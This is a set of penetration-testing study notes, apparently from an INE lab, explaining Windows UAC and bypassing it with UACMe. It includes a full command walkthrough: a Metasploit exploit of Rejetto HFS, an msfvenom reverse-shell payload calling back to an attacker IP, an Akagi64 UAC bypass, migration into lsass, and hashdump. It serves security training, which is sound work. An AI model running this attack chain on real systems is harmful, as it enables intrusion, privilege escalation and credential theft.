UAC (User Account Control)
- User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.
- UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is a part of the local administrators group.
- A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.
- Attacks can bypass UAC in order to execute malicious executables with elevated privileges.
- In the case that we have a Meterpreter session, or any form of shell on the target system, and want to perform an action with administrative privileges, a UAC prompt would be displayed on the target system's screen graphically, but nothing would be shown on our session, as such the only way for us to perform the action would be to bypass UAC controls altogether.

Bypassing UAC
- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.
- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
- There are multiple tools and techniques that can be used to bypass UAC, however, the tools and techniques used will depend on the version of Windows running on the target system, and the UAC level configured on the target system.

Bypassing UAC With UACMe
- UACMe is an open source, robust privilege escalation tool and guide developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques.
	- GitHub: https://www.github.com/hfiref0x/UACME 
- The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7 to Windows 10.
- It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.
- The UACMe GitHub repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.

Practical Demonstration
- Demonstration of UAC on a Windows system
	- Windows Command Prompt (From a user account that is a part of the local administrators group):
		- `net users`
		- `net localgroup administrators`
	- Next we can to run cmd.exe as administrator, in order for the system to prompt us with a UAC prompt.
	- The prompt would have been a credential prompt instead, if the user account we were logged in as wouldn't have been a part of the local administrators group.
	- Next we can open the "User Account Control Settings" to see the difference between the various different levels of UAC.
	- The High level of UAC also notifies the user incase a change is made to the system's settings, making it very difficult to bypass.
	- The default UAC option on a vanilla install of Windows is never set to the High level.
- UACME Usage Explanation:
	- In this demonstration we are going to use a compiled Akagi binary to bypass UAC, UACMe does not provide compiled binaries, and as such one would have to go through the compilation process before using the tool.
	- It is essential to go through the documentation for UACMe, to understand which technique is to be used in a particular scenario, and how to actually use it.
	- Usage of the Akagi binary can be performed with the following options, method and payload, where we first type in the corresponding number for the method of UAC bypass, and then the path to the payload we want to bypass UAC for the execution of.
		- `Akagi64.exe 1 ./payload.exe`
		- The version or the type of method to use will depend on the version of Windows running on the target, as well as the technique you have found to be most usable in the particular scenario.
- Exploitation
	- `nmap demo.ine.local`
	- A vulnerable HTTP file server, developed by Rejetto, is running on port 80.
	- `searchsploit hfs`
	- `service postgresql start; msfconsole`
	- `setg RHOSTS demo.ine.local`
	- `search rejetto`
	- `use exploit/windows/http/rejetto_hfs_exec`
	- `set payload windows/meterpreter/reverse_tcp`
	- `options`
	- `exploit`
	- Meterpreter Session:
		- `sysinfo`
		- We have a 32 bit Meterpreter session running so we will now try to migrate to a running process, using its process ID, to upgrade our Meterpreter session to a 64 bit session instead.
		- `pgrep explorer`
		- `migrate 2448`
		- We migrated to the `explorer` process for better stability, since it is a commonly run process.
		- `sysinfo`
		- `getuid`
		- Our current victim user account is not an administrator user, even though his username is 'admin'.
		- `getprivs`
		- `shell`
		- Windows Command Prompt
			- `net user`
			- `net localgroup administrators`
			- The command above displays users that are a part of the administrators group, here we can witness that the admin user, even though not an administrator, is a part of the administrators group, and has elevated privileges.
			- `net user admin password123`
			- The above command is used to change the password of the given user, it will give us an error or fail to execute, even though with have administrative privileges, because the execution of the command launches a UAC prompt.
	- Now that we have access to the target system via the non-Administrator 'admin' account. we will generate a payload using MSFvenom, upload it to the target system, and execute it bypassing UAC using Akagi64 from UACMe.
	- Starting a listener on the Attack Machine:
		- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe`
		- `file backdoor.exe`
		- `ls`
		- `msfconsole`
		- `use multi/handler`
		- `set payload windows/meterpreter/reverse_tcp`
		- `set LHOST 10.10.5.2`
		- `set LPORT 1234`
		- `run`
	- Back to our pre-existing Meterpreter session:
		- `pwd`
		- `getuid`
		- `getprivs`
		- `cd C:\\`
		- `mkdir Temp`
		- `cd Temp`
		- `upload backdoor.exe`
		- `upload /root/Desktop/tools/UACME/Akagi64.exe`
		- `shell`
		- Windows Command Prompt:
			- `.\Akagi64.exe 23 C:\Temp\backdoor.exe`
	- Back again to the TCP Listener on our Attack Machine, to verify that we have a reverse shell on the target system form the backdoor.exe payload we just executed:
		- New Meterpreter Session:
			- `sysinfo`
			- `getuid`
			- `getprivs`
			- Now we will observe that we have access to the target machine via the same user, 'admin', but the privileges we have with the 'admin' user have elevated.
			- We can now migrate to any running processes that have Administrative privileges, `NT AUTHORITY`.
			- `ps`
			- `pgrep lssas`
			- `migrate 688`
			- `sysinfo`
			- `getuid`
			- We will now have administrative, `NT AUTHORITY` privileges.
			- `hashdump`